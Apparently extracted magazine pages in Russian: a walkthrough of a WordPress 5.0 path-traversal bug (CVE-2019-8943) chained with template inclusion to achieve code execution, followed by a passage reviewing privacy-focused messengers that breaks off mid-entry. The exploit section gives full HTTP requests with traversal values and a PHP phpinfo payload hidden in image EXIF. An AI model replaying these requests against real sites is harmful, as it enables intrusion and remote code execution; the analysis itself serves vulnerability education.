   Какие же интересные ключи мы можем переза писать в наших аттачах?


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

          ОТКРЫТКА
        WORDPRESS    ДЛЯ
             ЗАХВАТЫВАЕМ КОНТРОЛЬ НАД САЙТОМ,
                        СПРЯТАВ КОД В КАРТИНКЕ





ПРИЧИНЫ ВОЗНИКНОВЕНИЯ ОШИБКИ PATH TRAVERSAL (CVE-
2019-8943)
Чтобы узнать ответ на этот вопрос, нужно пос мотреть на функци ональность
работы с картинками, которую предос тавляет WordPress. Здесь, помимо про‐
чего, имеется возможность кадрировать картинку (crop).





                 Режим кадрирова ния в WordPress

Процесс кропа начинается с функции wp_ajax_crop_image.


/wp-admin/includes/ajax-actions.php
3217: /**
3218:  * Ajax handler for cropping an image.
...
3222: function wp_ajax_crop_image() {
3223:   $attachment_id = absint( $_POST['id'] );
...
3231:   $data    = array_map( 'absint', $_POST['cropDetails'] );
3232:   $cropped = wp_crop_image( $attachment_id, $data['x1'], $data[
'y1'], $data['width'], $data['height'], $data['dst_width'], $data['
dst_height'] );

В POST‐запросе передается id картинки, с которым функция будет работать,
а в параметре cropDetails — информа ция о деталях кадрирования. С этими
данными происходит вызов wp_crop_image.


/wp-admin/includes/image.php
25: function wp_crop_image( $src, $src_x, $src_y, $src_w, $src_h, $
dst_w, $dst_h, $src_abs = false, $dst_file = false ) {
26:     $src_file = $src;
27:     if ( is_numeric( $src ) ) { // Handle int as attachment ID
28:         $src_file = get_attached_file( $src );

Здесь объявляется переменная $src_file,  в  которой  находится  путь
до обрабатываемой картинки. Его возвращает функция get_attached_file.


/wp-admin/includes/post.php
367: /**
368:  * Retrieve attached file path based on attachment ID.
...
385: function get_attached_file( $attachment_id, $unfiltered = false
) {
386:    $file = get_post_meta( $attachment_id, '_wp_attached_file',
true );
387:
388:    // If the file is relative, prepend upload dir.
389:    if ( $file && 0 !== strpos( $file, '/' ) && ! preg_match( '|^
.:\\\|', $file ) && ( ( $uploads = wp_get_upload_dir() ) && false ===
 $uploads['error'] ) ) {
390:        $file = $uploads['basedir'] . "/$file";
391:    }
392:
393:    if ( $unfiltered ) {
394:        return $file;
395:    }
...
405:    return apply_filters( 'get_attached_file', $file, $attach
ment_id );
406: }

Обрати внимание на стро ку 386. Путь берет ся из метаданных, а именно
из ключа _wp_attached_file. А метаданные мы можем спокойно контро‐
лировать. Затем к этой строке подставляет ся путь до директории с поль‐
зовательскими файлами, по дефолту это wp‐content/uploads.
  Вернемся в wp_crop_image. После получения пути WordPress должен убе‐
диться, что изображение действитель но существу ет.


/wp-admin/includes/image.php
30:         if ( ! file_exists( $src_file ) ) {
31:             // If the file doesn’t exist, attempt a URL fopen on
the src link.
32:             // This can occur with certain file replication
plugins.
33:             $src = _load_image_to_edit_path( $src, 'full' );
34:         } else {
35:             $src = $src_file;
36:         }

Здесь есть два варианта. Первый: если путь до файла, который указан в _w‐
p_attached_file, существует, то он и будет использован в дальнейшем.
Второй вариант: путь не существу ет, тогда функция _load_image_to_edit_‐
path попытается загрузить изображение со сво его собственного сервера.
Для этого будет сгенерирован URL для загрузки, сос тоящий из адреса сер‐
вера, каталога wp‐content/uploads и данных из метазаписи _wp_at‐
tached_file.
  Например, ты загрузил картинку с именем Mia.jpg. Тогда в _wp_at‐
tached_file будет что‐то вроде 2019/02/Mia.jpg, в зависимости от настро‐
ек. При обработке CMS сна чала проверит путь /var/www/html/wp‐content/
uploads/2019/02/Mia.jpg и, если его там нет, попытается загрузить файл
по URL http://wprce.vh/wp‐content/uploads/2019/02/Mia.jpg. Такое
поведение бывает нужно в случаях, когда какой‐то плагин генерирует изоб‐
ражение на лету при дос тупе к определен ному URL. При этом никакой филь‐
трации WordPress не выполняет.
  После загрузки изоб ражения вызывается функция wp_get_image_editor.


/wp-admin/includes/image.php
39:     $editor = wp_get_image_editor( $src );
40:     if ( is_wp_error( $editor ) )
41:         return $editor;

Она определяет, какая биб лиотека для работы с изображением будет
использоваться.


/wp-includes/media.php
2900: function wp_get_image_editor( $path, $args = array() ) {
2901:   $args['path'] = $path;
...
2903:   if ( ! isset( $args['mime_type'] ) ) {
2904:       $file_info = wp_check_filetype( $args['path'] );
...
2912:   $implementation = _wp_image_editor_choose( $args );

Тут всего два варианта: ImageMagick и GD, при чем первая в приоритете.


/wp-includes/media.php
2950: function _wp_image_editor_choose( $args = array() ) {
2951:   require_once ABSPATH . WPINC . '/class‐wp‐image‐editor.php';
2952:   require_once ABSPATH . WPINC . '/class‐wp‐image‐editor‐gd.php
';
2953:   require_once ABSPATH . WPINC . '/class‐wp‐image‐editor‐
imagick.php';
...
2962:   $implementations = apply_filters( 'wp_image_editors', array(
'WP_Image_Editor_Imagick', 'WP_Image_Editor_GD' ) );
2963:
2964:   foreach ( $implementations as $implementation ) {
2965:       if ( ! call_user_func( array( $implementation, 'test' ),
$args ) )
2966:           continue;

Последовательно из классов WP_Image_Editor_Imagick и WP_Image_Edi‐
tor_GD вызывается метод test, который и проверяет наличие своей биб‐
лиотеки в системе.


/wp-includes/class-wp-image-editor-imagick.php
16: class WP_Image_Editor_Imagick extends WP_Image_Editor {
...
45:     public static function test( $args = array() ) {
46:
47:         // First, test Imagick’s extension and classes.
48:         if ( ! extension_loaded( 'imagick' ) || ! class_exists( '
Imagick', false ) || ! class_exists( 'ImagickPixel', false ) )
49:             return false;
50:
51:         if ( version_compare( phpversion( 'imagick' ), '2.2.0',
'<' ) )
52:             return false;


/wp-includes/class-wp-image-editor-gd.php
16: class WP_Image_Editor_GD extends WP_Image_Editor {
...
41:     public static function test( $args = array() ) {
42:         if ( ! extension_loaded('gd') || ! function_exists('
gd_info') )
43:             return false;

После того как переменная $editor становится экземпляром нужного клас‐
са, вызывается метод crop.


/wp-admin/includes/image.php
43:     $src = $editor‐>crop( $src_x, $src_y, $src_w, $src_h, $dst_w,
 $dst_h, $src_abs );
44:     if ( is_wp_error( $src ) )
45:         return $src;


/wp-includes/class-wp-image-editor-imagick.php
492:    public function crop( $src_x, $src_y, $src_w, $src_h, $dst_w
= null, $dst_h = null, $src_abs = false ) {
493:        if ( $src_abs ) {
494:            $src_w ‐= $src_x;
495:            $src_h ‐= $src_y;
496:        }
...
498:        try {
499:            $this‐>image‐>cropImage( $src_w, $src_h, $src_x, $
src_y );

Теперь, когда картинка обра бота на, нужно ее сохранить. За это отвечает сле‐
дующий кусок кода:


/wp-admin/includes/image.php
47:     if ( ! $dst_file )
48:         $dst_file = str_replace( basename( $src_file ), 'cropped‐
' . basename( $src_file ), $src_file );
...
54:     wp_mkdir_p( dirname( $dst_file ) );
55:
56:     $dst_file = dirname( $dst_file ) . '/' . wp_unique_filename(
dirname( $dst_file ), basename( $dst_file ) );
57:
58:     $result = $editor‐>save( $dst_file );

В переменную $dst_file записывается путь, по которому будет сохраняться
результирующая картинка. К имени файла добавляется префикс cropped‐,
а путь берется из переменной $src_file, то есть путь, которым мы можем
манипулировать. Если путь не существу ет, то функция wp_mkdir_p любез но
создаст его для нас и наз начит необходимые пра ва.


/wp-includes/functions.php
1597: function wp_mkdir_p( $target ) {
1598:   $wrapper = null;
...
1621:   if ( file_exists( $target ) )
1622:       return @is_dir( $target );
...
1630:   // Get the permission bits.
1631:   if ( $stat = @stat( $target_parent ) ) {
1632:       $dir_perms = $stat['mode'] & 0007777;
1633:   } else {
1634:       $dir_perms = 0777;
1635:   }
1636:
1637:   if ( @mkdir( $target, $dir_perms, true ) ) {

Дальше метод save выполняет предварительные проверки и передает
управление make_image, который уже сохраняет файл по указанному пути.


/wp-includes/class-wp-image-editor-imagick.php
590:    public function save( $destfilename = null, $mime_type = null
 ) {
591:        $saved = $this‐>_save( $this‐>image, $destfilename, $
mime_type );
...
615:    protected function _save( $image, $filename = null, $mime_t
ype = null ) {
...
621:        try {
...
626:            $this‐>make_image( $filename, array( $image, 'writeI
mage' ), array( $filename ) );


/wp-includes/class-wp-image-editor.php
014: abstract class WP_Image_Editor {
...
394:    protected function make_image( $filename, $function, $argume
nts ) {
395:        if ( $stream = wp_is_stream( $filename ) ) {
...
404:        if ( $result && $stream ) {
405:            $contents = ob_get_contents();
406:
407:            $fp = fopen( $filename, 'w' );
408:
409:            if ( ! $fp ) {
410:                ob_end_clean();
411:                return false;
412:            }
413:
414:            fwrite( $fp, $contents );
415:            fclose( $fp );
416:        }

Итак, если ты  загружал Mia.jpg,  то пос ле выпол нения  кадрирования
получишь  файл  /var/www/html/wp‐content/uploads/2019/02/cropped‐
Mia.jpg.





                Сохраненная кадрированная картинка

Эта логика сле по доверяет метаключу _wp_attached_file, используя его
значение, когда создает ся путь сохранения файлов. Здесь‐то и кроется
проблема. Зная причину и уязвимое мес то, переходим к практической экс‐
плуатации.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

          ОТКРЫТКА
        WORDPRESS    ДЛЯ
             ЗАХВАТЫВАЕМ КОНТРОЛЬ НАД САЙТОМ,
                        СПРЯТАВ КОД В КАРТИНКЕ





РЕШАЕМ ПРОБЛЕМЫ И ЭКСПЛУАТИРУЕМ УЯЗВИМОСТЬ PATH
TRAVERSAL
Итак, легитимное значение _wp_attached_file в случае загрузки картинки
Mia.jpg имеет вид 2019/02/Mia.jpg. Но ведь ты можешь произвольно его
менять. И добавить, например, в начало конс трукцию ../. Для этого перех‐
ватим POST‐зап рос на редактирова ние записи и добавим к нему параметр
meta_input[_wp_attached_file] со зна чением ../Mia.jpg.


POST /wp‐admin/post.php HTTP/1.1
Host: wprce.vh
Content‐Length: 801
Content‐Type: application/x‐www‐form‐urlencoded
Cookie: <валидные_куки>
_wpnonce=<валидный_токен>&action=editpost&post_ID=10&meta_input[
_wp_attached_file]=../Mia.jpg





           Меняем метаданные загруженной картинки

Теперь выполняем запрос на кроп картинки. Сначала нужно получить валид‐
ный токен _ajax_nonce, для этого достаточно перейти в режим редактирова‐
ния картинки и поймать зап рос с экшеном image‐editor.





             Получение валидного токена _ajax_nonce


POST /wp‐admin/admin‐ajax.php HTTP/1.1
Host: wprce.vh
Content‐Length: 93
Content‐Type: application/x‐www‐form‐urlencoded; charset=UTF‐8
Cookie: <валидные_куки>
action=crop‐image&_ajax_nonce=<валидный_токен>&id=10&cropDetails[
width]=200&cropDetails[height]=200





     Попытка эксплуата ции уязвимости path traversal в WordPress 5.0

Таким образом мы пыта емся выйти из директории wp‐content/uploads/
и записать кадрированный файл на уро вень выше — в wp‐content. Но эта
попытка не увенчается успехом из‐за того, что ори гинальная картинка рас‐
полагается по другому пути. И попытки обмануть file_exist не приведут
к желаемым результатам, так как эта функция PHP не очень дружелюбна к ата‐
кующему и не позволя ет манипулировать путями.





            Манипуляция с путями в функции ﬁle_exist

Однако нас выручает второй вариант — загрузка файла по URL. Тут уже есть
где разгуляться. Что бы загрузилась настоящая картинка, указываем реальный
путь до нее. В параметрах передаем набор конструкций ../, чтобы попасть
в нужную директорию.


2019/02/Mia.jpg?/../../../../Mia.jpg

Сервер попытается перейти по полученному URL:


http://wprce.vh/wp‐content/uploads/2019/02/Mia.jpg?/../../../../Mia.
jpg

Все, что идет после знака вопроса, не будет иметь значения, и картинка
успешно загрузится и будет дос тупна для пос леду ющих манипу ляций.





        Картинка для выполнения кадрирования загружена по URL

Дальше мы сталкиваемся с еще одной «проблемой». Так как папки cropped‐
Mia.jpg? не существует, функция writeImage из ImageMagick вернет соот‐
ветствующую ошибку.





  Ошибка при сохранении кадрированной картинки. Директория не сущес‐
  твует

Проблема решается очень прос то — нужно сна чала соз дать эту директорию,
манипулируя все той же функцией кро па. Фишка в том, чтобы использовать
разные име на для директории и файла, который мы хотим создать. Ведь
при формировании пути, по которому будет рас полагаться кадрированное
изображение, ищутся все вхождения имени файла с добавлением префикса
cropped‐.


/wp-admin/includes/image.php
47:     if ( ! $dst_file )
48:         $dst_file = str_replace( basename( $src_file ), 'cropped‐
' . basename( $src_file ), $src_file );





                Результат работы функции basename

Поэтому обновляем метаключ _wp_attached_file у загруженного файла.
Устанавливаем его зна чение в wp‐content/uploads/2019/02/Mia.jpg?/
anything.


POST /wp‐admin/post.php HTTP/1.1
Host: wprce.vh
Content‐Length: 102
Content‐Type: application/x‐www‐form‐urlencoded
Cookie: <валидные_куки>
_wpnonce=<валидный_токен>&action=editpost&post_ID=10&meta_input[
_wp_attached_file]=2019/02/Mia.jpg?/anything

Теперь выполняем операцию кропа, и директория Mia.jpg? будет создана.





  Создание необходимой директории при помощи манипуляции с _wp_at‐
  tached_ﬁle и функциональ ностью кадрирования

Обрати внимание, что ImageMagick автоматически подставляет расширение,
определяя тип исходного файла.


/wp-includes/class-wp-image-editor-imagick.php
615:    protected function _save( $image, $filename = null, $mime_t
ype = null ) {
616:        list( $filename, $extension, $mime_type ) = $this‐>get_ou
tput_format( $filename, $mime_type );
617:
618:        if ( ! $filename )
619:            $filename = $this‐>generate_filename( null, null, $
extension );
...
625:            $this‐>image‐>setImageFormat( strtoupper( $this‐>
get_extension( $mime_type ) ) );

Такое поведе ние не поз волит нам просто загрузить шелл на PHP. Печально,
но не критично.
   Дальше снова обновляем _wp_attached_file. В этот раз смело указыва‐
ем созданную папку, в которую хотим сохранить обработанный файл.


POST /wp‐admin/post.php HTTP/1.1
Host: wprce.vh
Content‐Length: 801
Content‐Type: application/x‐www‐form‐urlencoded
Cookie: <валидные_куки>
_wpnonce=<валидный_токен>&action=editpost&post_ID=10&meta_input[
_wp_attached_file]=2019/02/Mia.jpg?/../../../../owned

Теперь весь набор для успешной эксплуата ции path traversal у нас в руках.
Есть файл Mia.jpg, и выполнение скрипта не прервется на попытке загрузки
изображения по URL http://wprce.vh/wp‐content/uploads/2019/02/Mia.
jpg?/../../../../owned.jpg. Создана папка Mia.jpg?, так что функция
writeImage из ImageMagick не вернет ошиб ку. Осталось лишь отправить зап‐
рос на кадрирование.





    В процессе эксплуатации уяз вимос ти path traversal в WordPress 5.0

После выполнения запроса можем наб людать соз данный файл owned.jpg
в директории wp‐content.





      Успешная эксплуата ция уязвимости path traversal в WordPress 5.0

Кстати, на серверах с Windows такой трюк не прокатит, так как символ знака
вопроса (?) зарезервирован системой для поис ка, инс трукций командной
строки и прочего. Но формат URL гибок, и ты можешь спокойно заменить
везде знак вопроса на решетку без потерь.





               Особенности имен папок в Windows


ЭКСПЛУАТИРУЕМ ВЫПОЛНЕНИЕ ПРОИЗВОЛЬНОГО КОДА. ИНКЛУД
ШАБЛОНОВ
Файл мы создали, но, во‐первых, это картинка, во‐вторых… это просто кар‐
тинка! :) Естественно, я могу записать в один из тегов EXIF произвольный код
на PHP, но как его вызвать?
  В этом нам снова поможет возможность манипулирования метаданными
записей. WordPress, как и все современные CMS, под держивает темы офор‐
мления. Доступные для использования темы хранятся в каталоге wp‐con‐
tent/themes. Они могут содержать файлы‐шаблоны для разных типов
записей в CMS. Например, если посети тель хочет просмотреть страницу
(WP_Page), то WordPress попробу ет найти файл page.php в каталоге текущей
активной темы. Если такой файл найден, то он подгружается с помощью фун‐
кции include().


/wp-includes/template-loader.php
44: if ( defined('WP_USE_THEMES') && WP_USE_THEMES ) :
45:     $template = false;
...
53:     elseif ( is_attachment()     && $template = get_attachment_
template()     ) :
54:         remove_filter('the_content', 'prepend_attachment');
55:     elseif ( is_single()         && $template = get_single_temp
late()         ) :
56:     elseif ( is_page()           && $template = get_page_template
()           ) :
...
63:     else :
64:         $template = get_index_template();


/wp-includes/template.php
377: /**
378:  * Retrieve path of page template in current or parent template.
379:  *
380:  * The hierarchy for this template looks like:
381:  *
382:  * 1. {Page Template}.php
383:  * 2. page‐{page_name}.php
384:  * 3. page‐{id}.php
385:  * 4. page.php
386:  *
...
405: function get_page_template() {
...
407:    $template = get_page_template_slug();
...
417:    $templates = array();
418:    if ( $template && 0 === validate_file( $template ) )
419:        $templates[] = $template;
420:    if ( $pagename ) {
421:        $pagename_decoded = urldecode( $pagename );
422:        if ( $pagename_decoded !== $pagename ) {
423:            $templates[] = "page‐{$pagename_decoded}.php";
424:        }
425:        $templates[] = "page‐{$pagename}.php";
426:    }
427:    if ( $id )
428:        $templates[] = "page‐{$id}.php";
429:    $templates[] = 'page.php';
430:
431:    return get_query_template( 'page', $templates );


/wp-includes/template-loader.php
73:     if ( $template = apply_filters( 'template_include', $template
 ) ) {
74:         include( $template );

Помимо этого, име ется возможность выб рать кас томный шаблон для опре‐
деленных записей. Чтобы его использовать, пост дол жен иметь метаключ _w‐
p_page_template. В нем будет указано имя файла, который отвечает за шаб‐
лон. Единственное ограничение здесь в том, что файл должен находиться
в каталоге текущей активной темы. Но это легко обойти, если использовать
уже известную цепоч ку уязвимос тей.
   Итак, сначала нужно внедрить код на PHP в изображение, которое я буду
загружать на сервер. Для это го существует огромное количес тво способов. Я
просто добавлю строку <?php phpinfo();/* в проводнике Windows в свой‐
ствах картинки.





                 Добавляем код в EXIF картинки

Теперь загружаем этот файл на сервер, а затем эксплуатируем уяз вимость
и сохраняем кадрированный файл в директорию с текущей темой. По дефол‐
ту используется Twenty Nineteen, поэто му зап рос на изменение метаданных
будет выглядеть таким обра зом.


POST /wp‐admin/post.php HTTP/1.1
Host: wprce.vh
Content‐Length: 102
Content‐Type: application/x‐www‐form‐urlencoded
Cookie: <валидные_куки>
_wpnonce=<валидный_токен>&action=editpost&post_ID=11&meta_input[
_wp_attached_file]=2019/02/Mia.jpg?/../../../../themes/twenty
nineteen/owned





     Сохраняем картинку с кодом в директорию текущей активной темы

Вот тут нужно сказать нес колько слов об исполь зуемой на сервере библиоте‐
ке. ImageMagick по дефолту не вырезает EXIF при манипуляции с изоб‐
ражениями, даже при кадрировании. Именно поэто му я ее и выбрал.





  ImageMagick сох раняет добавленный в EXIF PHP‐код даже после кад‐
  рирования

А вот GD сносит всю лишнюю, по его мнению, информацию, и файл получа‐
ется девственно чистым. Так что это интерес ный челлендж — сгенерировать
такой файл, который после всех манипуляций будет содержать нужный нам
текст. Но если захочешь заморочиться, то наверняка что‐нибудь придумаешь.
   Итак, файл  cropped‐owned.jpg  создан  и  находится  в  директории
с текущей активной темой, а также содержит наш код. Теперь нужно подклю‐
чить этот файл в качес тве кас томного шаб лона для отображения записи.
Для этого начнем создание новой записи в блоге. Содержание может быть
произвольным, главное — перехватить пакет на сохранение. Добавляем
к нему параметр meta_input и ука зываем в качестве метаключа _wp_‐
page_template значение cropped‐owned.jpg.


meta_input[_wp_page_template]=cropped‐owned.jpg





  Указываем файл с кодом в качес тве шаб лона для поста при помощи
  манипуляции с метаданными

Это нужно сделать именно при соз дании поста, потому что потом нельзя
будет отредактировать метаключ.
   Теперь при переходе на стра ницу с этой записью инклудится наша кар‐
тинка с кодом на PHP, и мы видим результат вывода phpinfo().





              Успешная эксплуата ция RCE в WordPress 5.0

Ура! Мы получили RCE.
  Я набросал скриптик на JS, который автоматизирует экс плуатацию уяз‐
вимости. Найти его можно на моем GitHub. Запускается из любого места
на сайте, главное — быть авторизованным и иметь нужные права. В перемен‐
ной cmd можно указать код на PHP, который будет выпол нен.


ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





ВЫВОДЫ
Сегодня мы превратили безобидное изменение метаданных в грозное ору‐
жие, которое приводит к самым печальным последствиям для сис темы —
выпол нению исходного кода. Даже такие крупные CMS, как WordPress, не зас‐
трахованы от критических ошибок, стоит лишь посмотреть на логику работы
приложения под нужным углом.
   Так что скорее обновляйся на самую свежую версию WordPress. Исполь‐
зуй встроенную возможность апгрейда на акту альный релиз через панель
управления. На данный момент последняя версия — WordPress 5.1. Там эта
уязвимость исправлена. Раз работчики добавили проверку и фильтрацию
опасных метаданных при создании и обновлении записей.





                  Коммит с пат чем уязвимости

Возможно, этот решение лишь прикрыва ет воз можность эксплуатирования
описанной уязвимости, а не полностью запреща ет его. И может быть, именно
ты найдешь новый байпас!
ПРИВАТНОСТЬ


  ШИФРУЙСЯ
  ГРАМОТНО!
      ИЗУЧАЕМ ПЕРСПЕКТИВНЫЕ
          МЕССЕНДЖЕРЫ
          ДЛЯ ПРИВАТНОЙ
            ПЕРЕПИСКИ





Тайна  перепис ки  заботит  не  только
тру‐хакеров, но и миллионы простых поль‐
зователей, которые совсем не хотят, чтобы
их интимные фот ки и любовные послания
стали дос тоянием прогрессив ной общес‐        Валерия Губарева                                                                                     Аналитик в компании Digital
твенности. В прошлой статье мы иссле‐       veneramuholovka@yandex.ruSecurity (@DSecRU)
довали приватность и безопасность самых
популярных мессенджеров. Настало вре мя
пристально изучить их менее распростра‐
ненных, но оттого не менее интересных
конкурентов, претен дующих на более серь‐
езную защищенность.


Кри терии оцен ки
Здесь мало что изменилось по сравнению с предыду щим исследованием. Я
убрала проверку на бло кирование скрин шотов (это все равно слишком легко
обойти), но добавила пункты о возможности исполь зования одной учетной
записи сразу на нескольких устройствах и проверку на то, могут ли переда‐
ваться сообщения каким‐либо способом, кроме как в интерне те.
 • FOSS — доступен ли исходный код по сво бодной лицензии, как разработ‐
   чики взаимодействуют с сообществом, принимают ли патчи.
 • Сте пень цен трализации — требуется ли наличие центрального сер‐
   вера, который можно заб локировать, используется ли сеть серверов,
   или каждый клиент является одновременно и сервером (P2P).
 • Воз можность ано нимной регистрации и использования — есть ли
   привязка к телефону, и используются ли иные методы «жесткой аутен‐
   тификации».
 • Наличие End-to-End Encryption (E2EE) — некоторые мессенджеры
  имеют такую функцию по умолчанию, в других ее можно включить,
   но попадаются и те, где сквозного шифрования просто нет.
 • Син хро низация End-to-End encrypted чатов — наличие этой фун‐
   кции сильно упрощает жизнь, но техничес ки реализовать ее непросто,
   и встречается она редко.
 • Не обхо димость про верки отпе чатков E2EE (в том числе в груп-
  повых чатах) — не все мессенджеры имеют функцию проверки отпечат‐
   ков, некоторые не предлагают делать это откры то. Групповые чаты
   без проверки отпечат ков собеседников перес тают быть приватными.
 • Групповые E2EE-чаты — интересная функция, которая поз воляет шиф‐
   ровать переписку меж ду нес колькими пользователями.
 • Воз можность добавления устройств — использовать одну и ту же
   учетную запись на разных устройствах бывает не просто удобно, а необ‐
   ходимо.
 • Защита социального графа — важ но, собирает ли мессенджер
  информацию о контактах пользователя и дру гие данные.
 • Альтернативные спо собы передачи дан ных — проверка  воз‐
  можности передавать сообщения каким‐либо спо собом, кроме как через
   интернет.




                                       Офи циальный сайт   WICKR


Лицен зия: проприетарный клиент, открытый протокол (ис ходники)
Цен трализация: центра лизо ванный
Ано нимность: регистрация доступна без номера телефона, но при желании
можно его добавить
E2EE: есть, по умол чанию
Син хро низация E2EE: нет, при входе в учетную запись с дру гого девайса
предыдущая переписка не сохранилась
Про верка отпе чатков: мож но отправить собеседнику короткое видео
со своим лицом, чтобы он мог убедиться, что ты — это ты, но никакого уве‐
домления об этом нет. И эта функция в программе спрятана слишком глубоко
Воз можность добавления устройств: есть
Групповые E2EE-чаты: есть
Уве домление о про верке E2EE: уведомлений нет, возможность есть
Защита социального графа: при ложению можно раз решить дос туп
к списку контактов (делать это, конечно, не сто ит)
Альтернативные спо собы передачи дан ных: нет


  Мессенджер, основанный на блокчей не, — по уверениям раз работчиков,
анонимный на 100%. Переписка осу ществляется через серверы, но все
сообщения удаляются как с них, так и с компьютеров, смартфонов и других
девайсов, при этом поль зователь может сам настро ить продол жительность
хранения истории сооб щений.





Вся передаваемая информа ция может шифровать ся с использованием стан‐
дартов (AES‐256, ECDH‐521, RSA‐4096 TLD). Ради пущей безопасности
для каждого нового сооб щения формиру ется свой ключ. Вся перепис ка поль‐
зователей обезличена — сообщения не содержат имен отправителя, получа‐
теля и геометок.
  На сайте разработчика доступны три вер сии: me, ent и pro, однако бес‐
платно для личного использования мож но скачать только первую из них. Ent
и pro платные и имеют расширенный набор функций.
  Интересно, что этот мессенджер используется в некоторых государствен‐
ных и правительственных учреждениях. Хорошо это или плохо, сказать слож‐
но.


                                                        Antox в Google PlayTOX (ANTOX)


Лицен зия: GPLv3 (исходники)
Цен трализация: децентра лизованный
Ано нимность: да
E2EE: есть, по умол чанию
Син хро низация E2EE: нет
Про верка отпе чатков: что бы начать диалог, необ ходимо или ввести иден‐
тификатор собеседника, или считать его QR‐код
Воз можность добавления устройств: можно импортировать профиль c
одного смартфона на дру гой
Групповые E2EE-чаты: есть
Уве домление о про верке E2EE: в груп повой чат может добавиться
любой пользователь, который зна ет его ID, без предварительной проверки
отпечатков
Защита социального графа: есть
Альтернативные спо собы передачи дан ных: нет


   Этот мессенджер соз дала группа незави симых разработчиков, ратующих
за безопасность и приватность переписки. Прог рамма опенсорсная, все
сообщения передаются со сквоз ным шифрованием, отключить которое
не получится никак. Интерфейс мессенджера прос той и понятный, что меня
очень порадовало.





                                   Tox

В основе Antox лежит протокол Tox, который обес печивает голосовую и виде‐
освязь, возможность отправлять мгновенные сооб щения и передавать фай‐
лы, режим конференции с несколькими учас тни ками, а также другие фичи,
присущие практически каждому современному мес сенджеру. А главное —
в нем отсутствует реклама.





                                  Antox

Для каждой ОС разработчики придума ли свое клиент ское приложение. Прог‐
раммы qTox и μTox — это десктопные версии, Antox — мобильная версия
для Android, а Antidote предназна чен для пользователей iOS. Я рассмотрела
только Antox, оценить преимущества и недос татки реализаций мессендже ра
для других платформ ты можешь самос тоятельно.


                                       Офи циальный сайт    JAMI


Лицен зия: GPLv3 (исходники десктопной вер сии, ис ходники клиента для An‐
droid)
Цен трализация: децентра лизованный
Ано нимность: да
E2EE: есть, по умол чанию
Син хро низация E2EE: нет — перепис ки, предшествовавшие моменту вхо‐
да в аккаунт с нового устройства, не синхро низирова лись
Про верка отпе чатков: что бы добавить контакт, можно отсканировать QR‐
код, но можно найти контакт по нику или по идентификатору телефона.
Под  идентификатором  телефо на  подразумевается  пос ледовательность
из сорока символов, которая служит идентификатором пользователя. Можно
также поделиться своими контактными данными через любой другой мессен‐
джер, почту или передать их по Bluetooth
Воз можность добавления устройств: к одному устройству с помощью
генерируемого пин‐кода можно привязать нес коль ко аккаунтов
Групповые E2EE-чаты: нет
Защита социального графа: есть
Альтернативные спо собы передачи дан ных: нет


   Jami — это пол ностью опенсорсный мессенджер, код которого публику‐
ется по лицензии GPLv3. Программа вырос ла из проекта SFLphone.





Раньше эта программа называлась Ring, но за время написания статьи ее
успели переиме новать в Jami. Возможно, раз работчики сделали это, чтобы
избежать путаницы с другим мессенджером под таким же названи ем,
который не попал в мой список.
   Как и любой другой мессенджер, Jami поддерживает отправку текстовых
сообщений, безопасные и надеж ные аудио‐ и видеозвонки, а также передачу
документов и файлов.
  Для установки соединения между пользователями применяются рас пре‐
деленные хеш‐таблицы. Все ключи шифрования и идентификации остаются
в пределах смар тфона пользователя. Серверы не используются, то есть
пользователи образуют одноранговую сеть, что очень хорошо с точки зре ния
безопасности.


                                             Страница с описаниемCHAT.ONION


Лицен зия: исходники открыты, без лицензии
Цен трализация: децентра лизованный
Ано нимность: да, пользователю сра зу присваивает ся идентификатор
E2EE: да, по умол чанию
Син хро низация E2EE: нет
Про верка отпе чатков: чтобы добавить собеседника, необходимо отска‐
нировать его QR‐код и дать ему отска нировать свой
Воз можность  добавления  устройств:  существует  версия  только
для смартфонов, функцию входа в существующую учетную запись обнаружить
не удалось
Групповые E2EE-чаты: нет
Защита социального графа: есть
Альтернативные спо собы передачи дан ных: нет


   Этот мессенджер осно ван на onion‐маршрутизации, которая используется
в браузере Tor. Она позволяет скрыть IP‐адрес пользователя, метаданные
и любую другую идентифицирующую информа цию. Для этого каждое сооб‐
щение передается между несколькими прокси‐серверами в рандомном
порядке, прежде чем достигнет адресата. Ано нимность обеспечивается бла‐
годаря тому, что каждый сервер «зна ет», только откуда пришло сообщение
и куда его надо отправить дальше.





Каждому пользователю присваивается ID, состоящий из 16 символов, но для
упрощения жизни можно просто отска нировать QR‐код собеседника.
  Само приложение порадовало своим минима лизмом, как и сайт раз‐
работчиков.


                                     Продолжение статьи →
ПРИВАТНОСТЬ           ← НАЧАЛО СТАТЬИ
        ШИФРУЙСЯ
         ГРАМОТНО!
          ИЗУЧАЕМ ПЕРСПЕКТИВНЫЕ МЕССЕНДЖЕРЫ
                    ДЛЯ ПРИВАТНОЙ ПЕРЕПИСКИ





                                       Офи циальный сайт  FIRECHAT


Лицен зия: проприетарный
Цен трализация: децентра лизованный
Ано нимность: и да и нет. Свои данные вроде номера телефона указывать
не надо, но вот пример ное местополо жение пользователя можно определить
E2EE: есть
Син хро низация E2EE: при выходе из приложения можно импорти ровать
клю чи, чтобы иметь возможность затем дешифровать сообщения
Про верка отпе чатков: можно ограничить возможность пересыл ки зашиф‐
рованных сообщений — они будут отправляться только тем пользователям,
чьи отпечатки верифицированы
Воз можность добавления устройств: есть
Групповые E2EE-чаты: есть
Защита социального графа: вроде бы есть, но то, что в «общую комнату»
по умолчанию объединяются пользователи, находящиеся на небольшом рас‐
стоянии друг от друга, не очень‐то сочетается с безопасностью
Альтернативные спо собы передачи дан ных: по Bluetooth и Wi‐Fi


  Проприетарный мес сенджер,  соз данный  в  компании Open  Garden.
Работает весьма необычным способом: объединяет всех пользовате лей мес‐
сенджера, находящихся на расстоянии 200 шагов друг от друга, в одну сеть
посредством Bluetooth или Wi‐Fi. Обычное подклю чение к интернету ему
не требуется.





Сложно сказать, как соотносится с безопас ностью такой режим работы. Воз‐
можно, если очень постараться, получится определить личности пользовате‐
лей, например методами социальной инженерии. Ну и для общения с при яте‐
лем, живущим в другой стра не, этот мес сенджер никак не подходит.
  Интерфейс приложения крайне неочевидный, особенно если  учесть
необычный способ коммуника ции. И ситуаций, когда подобная программа
может пригодиться, не так мно го, разве что координация митингов и забас‐
товок. Но если такое приложение создано и его раз работка продол жается,
значит, спрос есть.


                                       Офи циальный сайт АДАМАНТ


Лицен зия: GPLv3 (исходники)
Цен трализация: децентра лизованный
Ано нимность: есть
E2EE: есть
